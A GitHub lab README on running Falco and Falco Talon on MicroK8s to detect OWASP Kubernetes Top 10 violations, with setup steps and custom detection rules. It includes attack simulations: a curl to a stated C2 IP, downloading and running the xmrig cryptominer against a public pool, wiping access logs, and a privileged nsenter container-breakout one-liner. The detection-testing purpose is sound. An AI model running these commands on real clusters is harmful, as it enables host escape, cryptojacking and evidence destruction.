# Running Falco on Microk8s for testing OWASP Top 10 controls

I was working on this lab in two different Github repositories due  to the change from @itcarlow.ie to @setu.ie email accounts:
https://github.com/nigel-falco/falco-talon-testing
<br/><br/>
Currently, you can contacting me directly via - ```C00292053@setu.ie```
<br/><br/>
Setting up Falco's Kubernetes Audit plugin for MicroK8s

To enable the addon:
```
microk8s enable falco
```
The addon can be disabled at any time with:
```
microk8s disable falco
```

Change the alias for ```microk8s kubectl get pods -A``` to just ```kubectl get pods -A``` 
```
echo 'alias kubectl="microk8s kubectl"' >> ~/.bashrc
source ~/.bashrc
```
Accessing the FalcoSideKick user interface
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```
```
sudo usermod -a -G microk8s $USER
sudo chown -f -R $USER ~/.kube
```
You will also need to re-enter the session for the group update to take place:
```
su - $USER
```
Will probably set up the alias at the start of each sesson:
```
alias kubectl='microk8s kubectl'
alias helm='microk8s helm3'
```
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
```
kubectl exec -it dodgy-pod -- bash
```

Enforce traffic control on ```Outbound Connection to C2 Servers```
```
curl 52.21.188.179
```

Confirm the pod was terminate by the Talon response engine:
```
kubectl events -n default dodgy-pod -w
```
In a separate tab, watch the response action play out
```
kubectl logs -n falco -l app.kubernetes.io/name=falco-talon
```

```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

# Enable K8s Auditing
Miscellaneous Instructions:
https://github.com/jasonumiker-sysdig/kubernetes-security-demos/blob/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/setup-microk8s.sh#L69
```
mkdir /var/snap/microk8s/common/var/lib/k8s_audit
```
```
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/audit-policy.yaml
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/webhook-config.yaml
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/falco-values.yaml
```
```
AGENT_SERVICE_CLUSTERIP=$(kubectl get service falco-k8saudit-webhook -o=jsonpath={.spec.clusterIP} -n falco) envsubst < webhook-config.yaml.in > webhook-config.yaml
```
```
cp ./webhook-config.yaml /var/snap/microk8s/common/var/lib/k8s_audit/
cp ./audit-policy.yaml /var/snap/microk8s/common/var/lib/k8s_audit/
cat /var/snap/microk8s/current/args/kube-apiserver > kube-apiserver
```
```
cat << EOF >> kube-apiserver
--audit-log-path=/var/snap/microk8s/common/var/lib/k8s_audit/k8s_audit_events.log
--audit-policy-file=/var/snap/microk8s/common/var/lib/k8s_audit/audit-policy.yaml
--audit-log-maxbackup=1
--audit-log-maxsize=10
--audit-webhook-config-file=/var/snap/microk8s/common/var/lib/k8s_audit/webhook-config.yaml
--audit-webhook-batch-max-wait=5s
EOF
```
```
mv /var/snap/microk8s/current/args/kube-apiserver /var/snap/microk8s/current/args/kube-apiserver-orig
cp ./kube-apiserver /var/snap/microk8s/current/args/
chown root:microk8s /var/snap/microk8s/current/args/kube-apiserver
```
```
microk8s stop
```
```
microk8s start
sleep 30
```
```
kubectl rollout status daemonset falco -n falco --timeout 300s
```

# Deploying Custom Rules
```
wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falco-talon/custom-rules.yaml
```

- K8sAudit DISABLED
```
helm upgrade falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  -f custom-rules.yaml
```

- K8sAudit ```ENABLED``` from same directory as ```custom-rules.yaml``` with forwarding set ```to Talon from Sidekick```.
```
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml --kube-apiserver https://127.0.0.1:16443 --set tty=true --set falcosidekick.config.webhook.address=http://falco-talon:2803 -f custom-rules.yaml
```

Remember to configure the ```IP address``` of the ```K8saudit webhook service``` in the ```webhook-config.yaml``` file:
```
sudo vi /var/snap/microk8s/common/var/lib/k8s_audit/webhook-config.yaml
```

Scale-down ```falco-talon``` deployment to a single pod for better log analysis
```
kubectl scale deployment -n falco --replicas=1 falco-talon
```

Check ```logs``` for the response engine:
```
kubectl logs -n falco -l app.kubernetes.io/name=falco-talon | grep kubernetes:terminate
```

Upgrade the Falco Talon response engine:#
```
helm upgrade falco-talon . -n falco
```
# Monitoring OWASP Specific Control Violations

http://localhost:2802/events/?since=1h&filter=owasp

## K01 - Insecure Workload Configuration

Privileged Pod (K01.01)
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
Read-only FS Pod (K01.02)
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/read-only-fs.yaml
```
Run as Root User (K01.03)
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/RunAsRoot.yaml
```

![progress](https://github.com/nigeldouglas-itcarlow/Falco-MicroK8s/assets/126002808/25fd1d08-10aa-4030-a44a-a463b6b83069)

## K03 - Overly Permissive RBAC

Unnecessary use of ```cluster-admin``` (K03.01)
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/cluster-admin.yaml
```

## K08 - Secrets Management

The rule works, but currently on responds to list actiity on a specific file directory.

```
- rule: List Service Account Secrets
  desc: Detects listing of service account secrets.
  condition: proc.name contains ls and proc.cmdline contains /var/run/secrets/kubernetes.io/serviceaccount
  output: List command detected for listing service account secrets (user=%user.name shell=%proc.name cmdline=%proc.cmdline)
  priority: NOTICE
  tags: [OWASP_K8S_R10, K08, secrets_management]
```

## K05: Inadequate Logging
Detect the clearing of critical access log files, typically done to erase evidence that could be attributed to an adversary's actions. To effectively customize and operationalize this detection, check for potentially missing log file destinations relevant to your environment, and adjust the profiled containers you wish not to be alerted on.
```
kubectl run clear-log-container --image=alpine --restart=Never --rm -it -- /bin/sh -c 'echo "Tampering with log file" > /var/log/access.log; cat /dev/null > /var/log/access.log'
```

## K04 - Lack of Centralized Policy Enforcement

The following command if run against the Kubernetes API will create a very special pod that is running a highly privileged container.
1. First we see ```hostPID: true```, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.
2. The ```nsenter``` command switches to a different ```mount``` namespace where pid 1 is running which is the host mount namespace.
3. Finally, we ensure the workload is ```privileged``` allowing us to prevent permissions errors. Boom!! Container breakout achieved.

```
 kubectl run r00t --restart=Never -ti --rm --image lol \
  --overrides '{"spec":{"hostPID": true, 
  "containers":[{"name":"1","image":"alpine", 
  "command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"], 
  "stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent", 
  "securityContext":{"privileged":true}}]}}' \
/
```

Providing a limited-scope rule to prevent the container escape scenario highlighted above:
```
- rule: Nsenter Launched in Privileged Container
  desc: Detect file system debugger nsenter launched inside a privileged container which might lead to container escape. This rule has a more narrow scope.
  condition: >
    spawned_process
    and container
    and container.privileged=true
    and proc.name=nsenter
  output: Nsenter launched started in a privileged container (evt_type=%evt.type user=%user.name user_uid=%user.uid user_loginuid=%user.loginuid process=%proc.name proc_exepath=%proc.exepath parent=%proc.pname command=%proc.cmdline terminal=%proc.tty exe_flags=%evt.arg.flags %container.info)
  priority: WARNING
  tags: [OWASP_K8S_T10, K05, mitre_privilege_escalation, T1611]
```

## K09: Misconfigured Cluster Components
```
kubelet --anonymous-auth=false --authorization-mode=Webhook --config=/etc/kubernetes/kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf
```
Here is the output proving that anonymous authorization mode is now deprecated in the latest versions of Kubernetes: <br/>
https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/#options
```
Flag --anonymous-auth has been deprecated, This parameter should be set via the config file specified by the Kubelet's --config flag. See https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/ for more information.
Flag --authorization-mode has been deprecated, This parameter should be set via the config file specified by the Kubelet's --config flag. See https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/ for more information.
E0212 12:01:54.234414 2684977 run.go:74] "command failed" err="failed to load kubelet config file, path: /etc/kubernetes/kubelet.conf, error: failed to load Kubelet config file /etc/kubernetes/kubelet.conf, error failed to read kubelet config file \"/etc/kubernetes/kubelet.conf\", error: open /etc/kubernetes/kubelet.conf: no such file or directory"
```


## Automate ALL Tests + Cleanup
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/test-simulations.yaml
```
```
kubectl delete -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/test-simulations.yaml
```
Forceful termination of pods in default namespace
```
kubectl delete pod <PODNAME> --grace-period=0 --force --namespace default
```
